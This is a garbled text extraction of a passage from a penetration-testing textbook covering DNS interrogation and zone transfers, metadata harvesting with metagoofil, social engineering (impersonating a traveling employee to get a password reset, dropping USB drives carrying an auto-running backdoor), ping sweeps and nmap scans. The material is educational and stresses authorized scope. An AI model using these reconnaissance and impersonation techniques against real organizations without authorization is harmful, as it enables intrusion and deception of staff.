  dns is a core component of both our local networks and the internet
 Among  fIGURE 2
9 Host Command Output
 fIGURE 2
8 Site Report for Syngress
com
 0cReconnaissance ChApTER 2 33 other things dns is responsible for the process of translating domain names  to iP addresses
 As humans it is much easier for us to remember e2809cgoogle
come2809d  rather than http://74
125
95
105
 However machines prefer the reverse
 dns  serves as the middle man to perform this translation process
 As penetration testers it is important to focus on the dns servers that belong  to our target
 the reason is simple
 in order for dns to function properly it  needs to be aware of both the iP address and the corresponding domain  name of each computer on its network
 in terms of reconnaissance gaining  full access to a companye28099s dns server is like finding a pot of gold at the end  of a rainbow
 or maybe more accurately it is like finding a blueprint to the  organization
 But in this case the blueprint contains a full listing of internal  iP addresses that belong to our target
 remember one of the key elements of  information gathering is to collect iP addresses that belong to the target
 Aside from the pot of gold another reason why picking on dns is so enjoy- able is that in many cases these servers tend to operate on the e2809cif it isne28099t broke  done28099t touch ite2809d principle
 inexperienced network administrators often regard their dns servers with sus- picion and mistrust
 oftentimes they choose to ignore the box completely  because they do not fully understand it
 As a result touching patching updat- ing or changing configurations on the dns server is often a low priority
 Add  this to the fact that most dns servers appear to be very stable (as long as the  administrator is not monkeying with it) and you have a recipe for a security  disaster
 these admins wrongly learn early in their career that the less they  mess with their dns servers the less trouble it seemed to cause them
 As a penetration tester given the number of misconfigured and unpatched  dns servers that abound today it is natural to assume that many current net- work admins operate under this same principle
 if the above statements are true in even a small number of organizations we  are left with valuable targets that have a high probability of being unpatched  or out of date
 so the next logical question becomes how do we access this  virtual pot of gold? Before we can begin the process of examining a dns server  we need an iP address
 earlier in our reconnaissance we came across several  references to dns
 some of these references were by host names whereas oth- ers were by iP addresses
 Using the host command we can translate any host  names into iP addresses and add these iPs to the potential target list
 Again  you must be sure to double- and triple-check that the iP you collect is within  your authorized scope before continuing
 now that we have a list of dns iP addresses that belong to or serve our tar- get we can begin the process of interrogating dns to extract information
  Although it is becoming more rare to find one of our first tasks when interact- ing with a target dns is to attempt a zone transfer
 remember dns servers contain a series of records that match up the iP address  and host name for all the devices that the servers are aware of
 many networks  0cThe Basics of hacking and penetration Testing 34 deploy multiple dns servers for the sake of redundancy or load balancing
 As  a result dns servers need a way to share information
 this e2809csharinge2809d process  occurs through the use of a zone transfer
 during a zone transfer also com- monly referred to as Axfr one dns server will send all the host-to-iP map- pings it contains to another dns server
 this process allows multiple dns  servers to stay in sync
 even if we are unsuccessful in performing a zone transfer we should still spend  time investigating any dns servers that fall within our authorized scope
 NS Lookup the first tool we will use to examine dsn is ns lookup
 ns lookup is a tool  that can be used to query dns servers and potentially obtain records about  the various hosts of which it is aware
 ns lookup is built into many versions  of linux including Backtrack and is even available via the windows command  prompt! ns lookup operates very similarly between the various operating sys- tems; however you should always review the specifics for your particular sys- tem
 You can do so in linux by reviewing the ns lookup man pages
 this is  accomplished by opening a terminal and typing: root@bt~# man nslookup ns lookup is a tool that can be run in interactive mode
 this simply means we  will first invoke the program and then feed it the particular switches we need  to make it function properly
 we begin using ns lookup by opening a termi- nal and entering: root@bt~# nslookup By issuing the e2809cnslookupe2809d command we start the ns lookup tool from the  operating system
 After typing e2809cnslookupe2809d and hitting enter your usual e2809c#e2809d  prompt will be replaced with a e2809c>e2809d prompt
 At this point you can enter the  additional information required for ns lookup to function
 we begin feeding commands to ns lookup by entering the e2809cservere2809d keyword  and an iP address of the dns server you want to query
 An example follows: server 8
8
8
8 ns lookup will simply accept the command and present you with another e2809c>e2809d  prompt
 next we specify the type of record we are looking for
 during the recon- naissance process there are many types of records that you may be interested in
  for a complete listing of the various dns record types and their description you  can use your newly acquired google skills! if you are looking for general infor- mation you should set the type to any by using the keyword e2809canye2809d: set type ee80b5 any if you are looking for specific information from the dns server such as the iP  address of the mail server that handles e-mail for the target organization we  would use the e2809cset type 5 mxe2809d
 0cReconnaissance ChApTER 2 35 we wrap up our initial dns interrogation with ns lookup by entering the tar- get domain after the next e2809c>e2809d prompt
 suppose you wanted to know what mail server is used to handle the e-mail for  syngress
 in a previous example we determined that one of syngresse28099s name  servers was e2809cns1
dreamhost
come2809d
 Here again we can use the host tool to  quickly determine what iP address is associated with ns1
dreamhost
com
 with  this information in hand we can use ns lookup to query dns and find mail  server for syngress
 figure 2
10 shows an example of this process; the name of  the e-mail server has been highlighted (in the bottom right of the screenshot)  and now needs to be added to our potential target list
 Dig Another great tool for extracting information from dns is e2809cdig
e2809d to work with  dig we simply open a terminal and enter the following command: dig @target_ip naturally you will need to replace the e2809ctarget_ipe2809d with the actual iP  address of your target
 Among other things dig makes it very simple to  attempt a zone transfer
 recall that a zone transfer is used to pull multiple  records from a dns server
 in some cases a zone transfer can result in the tar- get dns server sending all the records it contains
 this is especially valuable if  your target does not distinguish between internal and external iPs when con- ducting a zone transfer
 we can attempt a zone transfer with dig by using the  e2809ce28093t AXFRe2809d switch
 if we wanted to attempt a zone transfer against a fictitious dns server with an  iP address of 192
168
1
23 and a domain name of e2809cexample
come2809d we would  issue the following command in a terminal window: dig @192
168
1
23 example
com e28093t AXFR fIGURE 2
10 Using Host and NS Lookup to Determine the E-mail Server of Our Target
 0cThe Basics of hacking and penetration Testing 36 if zone transfers are allowed and not restricted you will be presented with a  listing of host and iP addresses from the target dns server that relate to your  target domain
 Backtrack has many additional tools that can be used to interact with dns
  these tools should be explored and utilized once you have a solid understand- ing of how dns works
 Please see the end of this chapter for a brief discussion  of some additional tools you may want to use when conducting a penetration  test involving dns
 EXTRACTING INfORMATION fROM E-MAIL SERvERS e-mail servers can provide a wealth of information for hackers and penetration  testers
 in many ways e-mail is like a revolving door to your targete28099s organiza- tion
 Assuming your target is hosting their own e-mail server this is often a  great place to attack
 it is important to remember e2809cYou cane28099t block what you  must let in
e2809d in other words for e-mail to function properly external traffic  must pass through your border devices like routers and firewalls to an internal  machine typically somewhere inside your protected networks
 As a result of this we can often gather significant pieces of information by  interacting directly with the e-mail sever
 one of the first things to do when  attempting to recon an e-mail server is to send an e-mail to the organization  with an empty 
bat file or a nonmalicious 
exe file like calc
exe
 in this case the  goal is to send a message to the target e-mail server inside the organization in  the hope of having the e-mail server inspect and then reject the message
 once the rejected message is returned back to us we can attempt to extract  information about the target e-mail server
 in many cases the body of the  message will include a precanned write-up explaining that the server does  not accept e-mails with potentially dangerous extensions
 this message often  indicates the specific vendor and version of antivirus that was used to scan the  e-mail
 As an attacker this is a great piece of information to have
 Having a return message from a target e-mail server also allows us to inspect  the headers of the e-mail
 inspecting the internet headers will often allow us to  extract some basic information about the e-mail server including iP addresses  and the specific software versions or brand of e-mail server running
 knowing  the iP address and software versions can be incredibly useful when we move  into the exploitation phase (step 3)
 MetaGoofil Another excellent information gathering tools is e2809cmetagoofil
e2809d metagoofil is  a metadata extraction tool that is written by the same folks who brought us  the Harvester
 metadata is often defined as data about data
 when you create a  document like microsoft word or a PowerPoint presentation additional data  is created and stored within your file
 this data often includes various pieces of  information that describe the document including the file name the file size  0cReconnaissance ChApTER 2 37 the file owner or username of the person who created the file and the location  or path where the file was saved
 this process occurs automatically without any  user input or interaction
 the ability of an attacker to read this information may present some unique  insights into the target organization including usernames system names files  shares and other goodies
 metagoofil is a tool that scours the internet look- ing for documents that belong to your target
 After finding these documents  metagoofil downloads them and attempts to extract useful metadata
 metagoofil is built into Backtrack and can be found by navigating to the  information gathering section off of the Backtrack option in the All Programs  menu
 likewise you can open a terminal window and enter the following  command: cd /pentest/enumeration/google/metagoofil After navigating to the metagoofil directory it is a good idea to create a  e2809cfilese2809d folder
 the purpose of this folder is to hold all the target files that will  be downloaded; this keeps the original directory clean
 You can create a new  folder by entering: mkdir files with this directory setup you can run metagoofil by issuing the following  command: 
/metagoofil
py -d syngress
com e28093f all -o results e28093t files let us examine the details of this command
 e2809c
/metagoofil
pye2809d is used to  invoke the metagoofil python script
 do not forget to put the e2809c
/e2809d in front  of the command
 the e2809ce28093de2809d switch is used to specify the target domain to be  searched
 the e2809ce28093fe2809d switch is used to specify which type or types of files you want  metagoofil to attempt to locate
 Utilizing the e2809calle2809d switch will force metagoofil  to locate and download all the different format types that it can process includ- ing ppt pdf xls odp docx and others
 You can also specify individual file types  to limit the returned results
 we use the e2809ce28093oe2809d switch to specify the name of the  report that metagoofil will generate for us
 lastly we specify the folder where we  want to store each of the files that metagoofil locates and downloads
 in an ear- lier step we created a e2809cfilese2809d directory; as a result our command e2809ce28093f filese2809d will  save each of the discovered documents into this folder
 while the output from metagoofil against syngress reveals nothing below  you will find a sample of the toole28099s output from a recent penetration test that  clearly provides additional value and should be included with our reconnais- sance data
 C:\\\\Documents and Settings\\\\dennisl\\\\My Documents\\\\ this example is rich with information
 first it provides us with a valid net- work username e2809cdennisl
e2809d second it clearly shows that dennis uses a windows  machine
 0cThe Basics of hacking and penetration Testing 38 SOCIAL ENGINEERING no discussion of reconnaissance would be complete without including social  engineering
 many people would argue that social engineering is one of the  most simple and effective means for gathering information about a target
 social engineering is the process of exploiting the e2809chumane2809d weakness that is  inherent in every organization
 when utilizing social engineering the attackere28099s  goal is to get an employee to divulge some information that should be kept  confidential
 let us assume you are conducting a penetration test on an organization
  during your early reconnaissance you discover an e-mail address for one of  the companye28099s sales people
 You understand that sales people are highly likely  to return product inquiry e-mails
 As a result you sent an e-mail from an anon- ymous address feigning interest in a particular product
 in reality you did not  care about the product
 the real purpose of sending the e-mail is to get a reply  from the sales person so you can review the e-mail headers contained in the  response
 this process will allow you to gather additional information about  the companye28099s internal e-mail servers
 let us take our social engineering example one step further
 suppose our sales- mane28099s name is Ben owned (we found this information during our reconnais- sance of the company website and in the signature of his e-mail response)
  let us assume that in this example when you sent the employee the product  inquiry e-mail you received an automatic reply with the notification that Ben  owned was e2809ccurrently out of the office travelling oversease2809d and e2809cwould be  gone for two weeks with only limited e-mail access
e2809d A classic example of social engineering would be to impersonate Ben owned  and call the target companye28099s tech support number asking for help resetting  your password because you are overseas and cannot access your webmail
 if  you are lucky the tech support people will believe your story and reset the  password
 Assuming they use the same password you now have access to Ben  ownede28099s e-mail and other network resources like VPn for remote access or  ftP for uploading sales figures and customer orders
 social engineering like reconnaissance in general takes both time and prac- tice
 not everyone makes a good social engineer
 in order to be successful you  must be supremely confident knowledgeable of the situation and flexible  enough to go e2809coff script
e2809d if you are conducting social engineering over the  phone it can be extremely helpful to have detailed and well-written notes in  case you are asked about some obscure detail
 Another example of social engineering is to leave UsB thumb drives or cds at  the target organization
 the thumb drives should be distributed to several loca- tions in or near the organization
 the parking lot the lobby the bathroom  and an employeee28099s desk are all great e2809cdrope2809d locations
 it is human nature for  most people to insert the thumb drive or cd into their Pc just to see what is  Openmirrors
com 0cReconnaissance ChApTER 2 39 on the drive
 in this example though the thumb drive or cd is preloaded with  a self-executing backdoor program that automatically launches when the drive  is inserted into the computer
 the backdoor is capable of bypassing the com- pany firewall and will dial home to the attackere28099s computer leaving the target  exposed and giving the attacker a clear channel into the organization
 we will  discuss the topic of backdoors in chapter 6
 SIfTING ThROUGh ThE INTEL TO fIND ATTACKABLE  TARGETS once you have completed the steps above you need to schedule some time  to closely review all the reconnaissance and information you have gathered
  in most cases even light reconnaissance should produce a mountain of data
  once the reconnaissance step is completed you should have a solid under- standing of your target including the organization structure and even technol- ogies deployed inside the company
 while conducting the review process it is a good idea to create a single list that  can be used as a central repository for recording iP addresses
 You should also  keep separate lists that are dedicated to e-mail addresses host names and Urls
 Unfortunately most of the data you collected will not be directly attackable
  during the process of reviewing your findings be sure to transform any rele- vant non-iP-based information into an iP address
 Using google and the host  command you should be able to extract additional iPs that relate to your tar- get
 Add these to the iP list
 After we have thoroughly reviewed the collected reconnaissance and trans- formed the data into attackable targets we should have a list of iPs that  either belong to serve or are related to the target
 As always it is important  to remember your authorized scope because not all the iPs we collect will be  within that range
 As a result the final step in reconnaissance is to review the  iP list you just created and either contact the company to determine if you can  increase the scope of the pen test or remove the iP address from your list
 At this point you will be left with a list of iP addresses that you are authorized  to attack
 do not discard or underestimate all the nonattackable information  you have gathered
 in each of the remaining steps we will be reviewing and  extracting information from step 1
 hOW DO I pRACTICE ThIS STEp? now that you have a solid understanding of the basic tools and techniques  used to conduct reconnaissance you will need to practice everything that was  covered
 there are many ways to go about practicing this step
 one simple and  effective idea is to make a list of companies by reading a newspaper
 if you do  not have access to a newspaper any popular news website will do like www
 cnn
com www
msnbc
com etc
 0cThe Basics of hacking and penetration Testing 40 while making a list of potential targets to conduct reconnaissance on try to  focus on company names that you have not heard of before
 Any good news- paper or website should contain dozens of companies that you are unfamil- iar with
 one note of caution here YoU mUst Be sUre not to do AnY  ActiVe reconnAissAnce! obviously you have not been authorized in any  way to perform the active techniques we covered in this chapter
 However you  can still practice gathering information through the passive techniques we dis- cussed
 this will allow you to refine and sharpen your skills
 it will also pro- vide you with an opportunity to develop a system for cataloging organizing  and reviewing the data you collect
 remember while this may be the e2809cleaste2809d  technical phase it has the potential for the best returns
 WhERE DO I GO fROM hERE? once you have practiced and mastered the basics of reconnaissance you will  be armed with enough information and skill to tackle advanced topics in infor- mation gathering
 the following is a list of tools and techniques that will take  your information-gathering ability to the next level: n search engine directives for sites other than google: l now that your google-fu is strong you need to master this technique  using other search engines
 most modern search engines include direc- tives or other ways to complete advanced searches
 remember you should  never rely on a single search engine to do all of your reconnaissance
  searching for the same keywords in different search engines often returns  drastically different and surprisingly useful results
 n search engine Assessment tool (seAt) l seAt is a great tool to use for quickly querying several different search  engines in a single pass
 this tool automates much of the manual labor  required when performing reconnaissance across several different search  engines
 seAt is built into Backtrack and available from its creator at  www
midnightresearch
com
 their site even includes useful e2809chow toe2809d  videos for using seAt
 n Johnny longe28099s google Hacking database (gHdB) l this is a single repository for some of the most effective and feared  google Hacks in existence today! it has already been mentioned and  should go without saying but do not rUn tHese QUeries AgAinst  UnAUtHoriZed tArgets! You can find the gHdB at http://www
 hackersforcharity
org/ghdb
 while you are there take a minute to read  about Hackers for charity and Johnnye28099s efforts with the e2809cfood for worke2809d  program
 n Google Hacking for Penetration Testers 2nd edition syngress l Johnnye28099s google Hacking book is a must-read for all penetration testers
 n Patervae28099s maltego ce l maltego is a very powerful tool that aggregates information from pub- lic databases and provides shockingly accurate details about your tar- get organization
 these details can be technical in nature such as the  0cReconnaissance ChApTER 2 41 location or iP address of your firewall or they can be personal such as  the physical location of your currently (travelling) salesman
 learning to  master maltego takes a little effort but is well worth your time
 A free  version is available in Backtrack
 SUMMARy information gathering is the first step in any penetration test or hack
 even  though this phase is less technical than most its importance should not be  overlooked
 the more information you are able to collect the better your  chances of success in later phases of the penetration test
 At first the amount of  information that can be gathered on your target can seem a bit overwhelming  but with a good documentation process the proper use of tools and further  practice you will soon master the art of reconnaissance
 0cThis page intentionally left blank Openmirrors
com 0c43 INTRODUCTION once step 1 has been completed you should have a solid understanding of  our target and a detailed collection of gathered information
 this data mainly  includes our collection of iP addresses
 recall that one of the final steps in  reconnaissance was to create a list of iP addresses that both belonged to the  target and that we were authorized to attack
 this list is the key to transition- ing from step 1 to step 2
 in step 1 we mapped our gathered information to  Scanning ChApTER 3 Information in This Chapter: n Pings and Ping Sweeps n Port Scanning n Vulnerability Scanning 0cThe Basics of hacking and penetration Testing 44 attackable iP addresses
 in step 2 we will map iP addresses to open ports and  services
 it is important to understand that it is the job of most networks to allow at  least some communication to flow into and out of their borders
 networks  that exist in complete isolation with no internet connection no services like  e-mail or web traffic are very rare today
 each service connection or potential  connection to another network provides a potential foothold for an attacker
  scanning is the process of identifying live systems and the services that exist on  those systems
 step 2 begins by breaking the scanning process into three distinct phases: 2
1 determining if a system is alive 2
2 Port scanning the system 2
3 scanning the system for vulnerabilities later in this chapter we will discuss tools that combine these phases into a sin- gle process; however for the purpose of introducing and learning new mate- rial it is best to cover them separately
 step 2
1 is the process of determining whether a target system is turned on and  capable of communicating or interacting with our machine
 this step is the  least reliable and we should always continue with steps 2
2 and 2
3 regardless  of the outcome of this test
 regardless it is still important to conduct this step  and make note of any machines that respond as alive
 step 2
2 is the process of identifying the specific ports and services running a  particular host
 simply defined ports provide a way or location for software and networks to  communicate with hardware like a computer
 A port is a data connection that  allows a computer to exchange information with other computers software or  devices
 Prior to the interconnection of computers and networks information  was passed between machines through the use of physical media like floppy  drives
 once computers were connected to a network they needed an efficient  means for communicating with each other
 Ports were the answer
 the use of  multiple ports allows for simultaneous communication without the need   to wait
 to further clarify this point for those of you who are unfamiliar with ports and  computers it may be helpful to consider the following analogy: think of your  computer as a house
 there are many different ways that a person can enter the  house
 each of the different ways to enter your house (computer) is like a com- puter port
 Just like a port on a computer all the entryways allow traffic to flow  into and out of your home
 imagine a house with unique numbers over each of the potential entry points
  most people will use the front door
 However the owners may come in  through the garage door
 sometimes people enter the house from a backdoor  0cScanning ChApTER 3 45 Table 3
1  Common Port Numbers and Their Corresponding Service Port Number Service 20 FTP data transfer 21 FTP control 22 SSH 23 Telnet 25 SMTP (e-mail) 53 DNS 80 HTTP 443 HTTPS or sliding glass door off the deck
 An unconventional person may climb  through a window or attempt to squeeze through the doggie door! regardless of how you get into your house each of these examples corresponds  nicely with the analogy of computers and ports
 recall that ports are like gate- ways to your computer
 some ports are more common and receive lots of traf- fic (just like your front door); others are more obscure and rarely used (by  humans) like the doggie door
 many common network services run on standard port numbers and can give  attackers an indication as to the function of the target system
 table 3
1 pro- vides a list of common ports and their corresponding services
 obviously there are many more ports and services
 However this list serves as  a basic introduction to common ports that are utilized by organizations today
  You will see these services repeatedly as you begin to port scan your targets
 we need to pay special attention to the discovery of any open ports on our  target systems
 You should make detailed notes and save the output of any tool  run in step 2
2
 remember every open port is a potential gateway into the tar- get system
 the final step in scanning is step 2
3 vulnerability scanning
 Vulnerability  scanning is the process of locating and identifying known weaknesses in the  services and software running on a target machine
 the discovery of known  vulnerabilities on a target system can be like finding the pot of gold at the end  of a rainbow
 many systems today can be exploited directly with little or no  skill when a machine is discovered to have a known vulnerability
 it is important to mention that there is a difference in the severity of various  vulnerabilities
 some vulnerabilities may present little opportunities for an  attacker whereas others will allow you to completely take over and control a  machine with a single click of a button
 we will discuss the various levels of  vulnerabilities in more detail later in the chapter
 in the past i have had several clients ask me to attempt to gain access to some  sensitive server on an internal network
 obviously in these cases the final  Table 3
1 0cThe Basics of hacking and penetration Testing 46 target is not directly accessible via the internet
 whether we are going after  some supersecret internal machine or simply attempting to gain access to a  network we usually begin by scanning the perimeter devices
 the reason for  this is simple we start at the perimeter because most of the information we  have from step 1 belongs to perimeter devices
 Also with many of todaye28099s tech- nologies and architectures it is not always possible to reach directly into a net- work
 As a result we often employ a hacking methodology where we chain a  series of machines together in order to reach our final target
 first we conquer a  perimeter device then we move to an internal machine
 Perimeter devices are computers servers routers firewalls or other equipment  which sit at the outer edge of a protected network
 these devices serve as an  intermediary between protected internal resources and external networks like  the internet
 As previously mentioned we often begin by scanning the perimeter devices  to look for weaknesses or vulnerabilities that will allow us to gain entry into  the network
 once we have successfully gained access (which we will discuss  in chapter 4) the scanning process can be repeated from the newly owned  machine in order to find additional targets
 this cyclical process allows us to  create a very detailed internal network map and discover the critical infrastruc- ture hiding behind the corporate firewall
 pINGS AND pING SWEEpS A ping is a special type of network packet called an icmP packet
 Pings work  by sending specific types of network traffic called icmP echo request pack- ets to a specific interface on a computer or network device
 if the device (and  the attached network card) that received the ping packet is turned on and not  restricted from responding the receiving machine will respond back to the  originating machine with an echo reply packet
 Aside from telling us that  a host is alive and accepting traffic pings provide other valuable information  including the total time it took for the packet to travel to the target and return
  Pings also report traffic loss that can be used to gauge the reliability of a net- work connection
 figure 3
1 shows an example of the ping command
 the first line in figure 3
1 shows the ping command being issued
 Please note  this particular screenshot was taken from a windows machine
 All modern ver- sions of linux and windows include the ping command
 the major difference  between the linux and windows version is that by default the windows ping  command will send four echo request packets and automatically terminate  whereas the linux ping command will continue to send echo request com- mands until you force it to stop
 on a linux system you can force a ping com- mand to stop sending packets by using the cntlee80b1c combination
 let us focus our attention on the third line that starts with e2809creply from
e2809d this  line is telling us that our icmP echo request packet successfully reached the iP  address of 64
233
167
99 and that the iP address sent a reply packet back to  Openmirrors
com 0cScanning ChApTER 3 47 our machine
 the e2809cbytesee80b532e2809d in the line indicate the size of the packet being  sent
 the e2809ctimeee80b526 mse2809d is telling you how long the entire round trip took for  the packets to travel to and from the target
 the e2809cttlee80b5240e2809d is a time to live  value; this is used to determine the maximum number of hops the packet will  take before automatically expiring
 now that you have a basic understanding of how the ping command works let  us see how we leverage this tool as a hacker
 Because we know that pings can  be useful in determining if a host is alive we can use the ping tool as a host  discovery service
 Unfortunately pinging every potential machine on even a  small network would be highly inefficient
 fortunately for us there are several  tools that allow us to conduct ping sweeps
 A ping sweep is a series of pings  that are automatically sent to a range of iP addresses rather than manually  entering the individual targete28099s address
 the simplest way to run a ping sweep is with a tool called fPing
 fPing is built  into Backtrack and is run from the terminal
 the tool can also be downloaded  for windows
 the easiest way to run fPing is to open terminal window and  type the following: fping e28093a e28093g 172
16
45
1 172
16
45
254>hosts
txt
  the e2809ce28093ae2809d switch is used to show only the live hosts in our output
 this makes  our final report much cleaner and easier to read
 the e2809ce28093ge2809d is used to specify  the range of iP addresses we want to sweep
 You need to enter both the begin- ning and the ending iP addresses
 in this example we scanned all the iPs from  172
16
45
1 to 172
16
45
254
 the e2809c>e2809d character is used to pipe the output to  a file and the hosts
txt is used to specify the name of the file our results will be  saved to
 there are many other switches that can be used to change the func- tionality of the fPing command
 You can view them all by entering the follow- ing command in a terminal window: man fping fIGURE 3
1 An Example of the Ping Command
 0cThe Basics of hacking and penetration Testing 48 once you have run the command above you can open the hosts
txt file that  was created to find a list of target machines that responded to our pings
 these  iP addresses should be added to your target list for later investigation
 it is  important to remember that not every host will respond to ping requests; some  hosts may be firewalled or otherwise blocking ping packets
 pORT SCANNING now that you have a list of targets we can continue our examination by scan- ning the ports on each of the iP addresses we found
 recall that the goal of port  scanning is to identify which ports are open and determine what services are  available on our target system
 A service is a specific job or task that the com- puter performs like e-mail ftP printing or providing web pages
 Port scanning  is like knocking on the various doors and windows of a house and seeing who  answers
 for example if we find that port 80 is open we can attempt a connec- tion to the port and oftentimes get specific information about the web server  that is listening on that port
 there are a total of 65536 (0e2809365535) ports on every computer
 Ports can be  either tcP or UdP depending on the service utilizing the port or nature of the  communication occurring on the port
 we scan computers to see what ports  are in use or open
 this gives us a better picture of the purpose of the machine  which in turn gives us a better idea about how to attack the box
 if you had to choose only one tool to conduct port scanning you would  undoubtedly choose nmap
 nmap was written by gordon e2809cfyodore2809d lyon and  is available for free from www
insecure
org and is built into many of todaye28099s  linux distributions including Backtrack
 Although it is possible to run nmap  from a graphical user interface (gUi) we are going to focus on using the termi- nal to run our port scans
 People who are new to security and hacking often ask why they should learn  to use the command line or terminal version of a tool rather than relying on a  gUi
 these same people often complain that using the terminal is not as easy
  the response is very simple
 first using the command line version of a tool will  allow you to learn the switches and options that change the behavior of your  tool
 this gives you more flexibility more granular control and a better under- standing of the tool you are running
 second (and maybe more importantly)  rarely does hacking work like it is portrayed in the movies
 finally the com- mand line can be scripted
 scripting and automation become key when you  want to advance your skillset to the next level
 remember the movie Swordfish where Hugh Jackman is creating a virus? He is  dancing and drinking wine and apparently building a virus in a very graphical  gUi-driven way
 the point is that this is just not realistic
 most people who are  new to hacking assume that hacking is a very gUi-oriented task: that once you  take over a machine you are presented with a desktop and control of the mouse  and screen
 Although this scenario is possible it is rarely the case
 in most jobs  0cScanning ChApTER 3 49 your main goal will be to get an administrative shell or backdoor access to the  machine
 this shell is literally a terminal that allows you to control the target Pc  from the command line
 it looks and feels just like the terminals that we have  been working with except a remote shell allows you to enter the commands  on your computer terminal and have them executed on the target machine
 so  learning the command line version of your tools is critical because once you  have control of a machine you will need to upload your tools and interact with  the target through a command prompt not through a gUi
 let us assume you still refuse to learn the command line
 let us also assume  that with the use of several tools you were able to gain access to a target system
  when you gain access to that system you will not be presented with a gUi but  rather with a command prompt
 if you do not know how to copy files add  users modify documents and make other changes through the command line  your work of owning the target will have been in vain
 You will be stuck like  moses who was able to see the promised land but not allowed to enter! when we conduct a port scan our tool will literally create a packet and send  it to each designated port on the machine
 the goal is to determine what kind  of a response we get from the target port
 different types of port scans can pro- duce different results
 it is important to understand the type of scan you are  running as well as the expected output of that scan
 The Three-Way handshake when two machines on any given network want to communicate using tcP  they do so by completing the three-way handshake
 this process is very similar  to a phone conversation (at least before everyone had caller id!)
 when you  want to talk to someone on the phone you pick up the phone and dial the  number the receiver picks up the ringing phone not knowing who the caller  is and says e2809cHello?e2809d the original caller then introduces himself by saying e2809cHi  this is John!e2809d in response to this the original receiver will often acknowledge  the caller by saying e2809coh hi John!e2809d At this point both people have enough  information for the conversation to continue as normal
 computers work much the same way
 when two computers want to talk they  go through a similar process
 the first computer connects to the second com- puter by sending a sYn packet to a specified port number
 if the second com- puter is listening it will respond with a sYn/Ack
 when the first computer  receives the sYn/Ack it replies with an Ack packet
 At this point the two  machines can communicate normally
 in our phone example above the origi- nal dialer is like sending the sYn packet
 the receiver picking up the phone  and saying e2809cHello?e2809d is like the sYn/Ack packet and the original caller intro- ducing himself is like the Ack packet
 Using Nmap to perform a TCp Connect Scan the first scan we will look at is called the tcP connect scan
 this scan is often  considered the most basic and stable of all the port scans because nmap  0cThe Basics of hacking and penetration Testing 50 attempts to complete the three-way handshake on each port specified in the  nmap command
 Because this scan actually completes the three-way hand- shake and then tears down the connection gracefully there is little chance that  you will flood the target system and cause it to crash
 if you do not specify a specific port range nmap will scan the 1000 most com- mon ports
 Unless you are in a great hurry it is always recommended specify- ing all ports
 the reason is that oftentimes crafty administrators will attempt  to obscure a service by running it on a nonstandard port
 You can scan all the  ports by specifying e2809c-p-e2809d when running nmap
 Using the e2809ce28093PNe2809d switch with  every nmap scan is recommended
 Utilizing the e2809ce28093PNe2809d switch will cause nmap  to disable host discovery and force the tool to scan every system as if it were  alive
 this is extremely useful for discovering additional systems and ports that  otherwise may be missed
 to run a tcP connect we issue the following command from a terminal: nmap e28093sT -p- -PN 172
16
45
135 take a moment to review this command
 the first word e2809cnmape2809d causes the  nmap port scanner to start
 the second command e2809ce28093sTe2809d tells nmap to run  a tcP connect scan
 specifically to break this switch down even further the  e2809c-se2809d is used to tell nmap what kind of scan we want to run
 the e2809c-Te2809d in the  e2809c-sTe2809d is used to run a scan type of tcP connect
 we use the e2809c-p-e2809d to tell  nmap to scan all the ports not just the default 1000
 we use the e2809ce28093PNe2809d switch  to skip the host discovery phase and scan all the addresses as if the system were  alive and responding to ping requests
 finally we specify the target iP address;  obviously your targete28099s iP address will be different from the one shown in the  screenshot! figure 3
2 shows the tcP connect nmap scan and the output that  was received when run against the target
 oftentimes we need to run our scans against an entire subnet or range of iP  addresses
 when this is the case we can instruct nmap to scan a continuous  range of iPs by simply appending the last octet of the ending iP address onto  the scan like so: nmap e28093sT -p- -PN 172
16
45
1-254 fIGURE 3
2 TCP Connect Scan and Results
 0cScanning ChApTER 3 51 issuing this command will cause nmap to port scan all the hosts between the  iP addresses 172
16
45
1 and 172
16
45
254
 Just like ping sweeps this is a  very powerful technique that can greatly improve the productivity of your scan- ning life! if you need to scan a series of hosts that are not in sequential order you can  create a text file and list each host iP address on a single line
 then add the  e2809ce28093iL path_to_the_text_filee2809d switch to your nmap command
 doing this  allows you to scan all of your target hosts from a single command
 whenever  possible always try to create a single text file containing all of your target iPs
  most of the tools we discuss have a switch or mechanism for loading this text  file which saves the effort or retyping but more importantly reduces the num- ber of times you will type each iP address and therefore reduces the chance  that you will fat-finger the iP address and scan the wrong target
 Using Nmap to perform a SyN Scan the sYn scan is arguably the most popular nmap port scan
 there are many  reasons for its popularity including the fact that it happens to be the default  nmap scan
 if you run the nmap command without specifying a scan type  (using the e28093s switch) nmap will use the sYn scan by default
 Aside from the fact that the sYn scan is the default choice it is also popular  because it is faster than the tcP connect scan and yet remains quite safe with  little chance of dose28099ing or crashing the target system
 sYn scans are faster  because rather than completing the entire three-way handshake it only com- pletes the first two steps
 in a sYn scan the scanning machine sends a sYn packet to the target and the  target responds with a sYn/Ack (assuming the port is in use and not filtered)  just like it did when we ran a tcP connect scan
 However at this point rather  than sending the traditional Ack packet the scanning machine sends an rst  (reset) packet to the target
 the reset packet tells the target machine to disre- gard any previous packets and close the connection between the two machines
  it should be clear that the speed advantage of the sYn scan over the tcP  connect scan comes from the fact that there are less packets sent between the  hosts when using a sYn scan rather than a tcP connect scan
 Although a few  packets may not sound like a big advantage it can add up quickly when scan- ning multiple hosts
 if we consider the example of comparing the three-way handshake to a phone  call sYn scans would be like calling someone up having the receiver pick up  the phone and saying e2809cHello?e2809d and then simply hanging up on the person  without a single word
 Another advantage to the sYn scan is that in some instances it provides a level  of obscurity or stealth
 Because of this feature the sYn scan is often referred  to as the e2809cstealth scan
e2809d the stealth portion of this scan comes from the fact  that because the three-way handshake is never fully completed the official  0cThe Basics of hacking and penetration Testing 52 connection was never 100 percent established
 there are applications and log  files that require the completion of the three-way handshake before they begin  recording activity
 As a result if a log file only records completed connections  and the sYn scan never officially completes a single connection this scan may  be undetected by some applications
 Please note this is the exception and not  the rule
 All modern firewalls and intrusion detection systems in use today will  detect and report a sYn scan! Because the sYn scan is the default nmap scan we do not technically need   to specify the scan type with the e2809ce28093se2809d switch
 However because this book  focuses on the basics it is worth the effort to get into the habit of specifying  your scan type
 to run a sYn scan you can open a terminal window and issue the following  command: nmap e28093sS -p- -PN 172
16
45
135 this command is exactly the same as the previous example with one excep- tione28094rather than using an e2809ce28093ste2809d we used an e2809ce28093ss
e2809d this instructs nmap to run  a sYn scan rather than a tcP connect scan
 the scan types are easy to remem- ber because a tcP connect scan begins with the letter e2809cte2809d whereas the sYn  scan begins with the letter e2809cs
e2809d each of the other switches was explained in the  section above
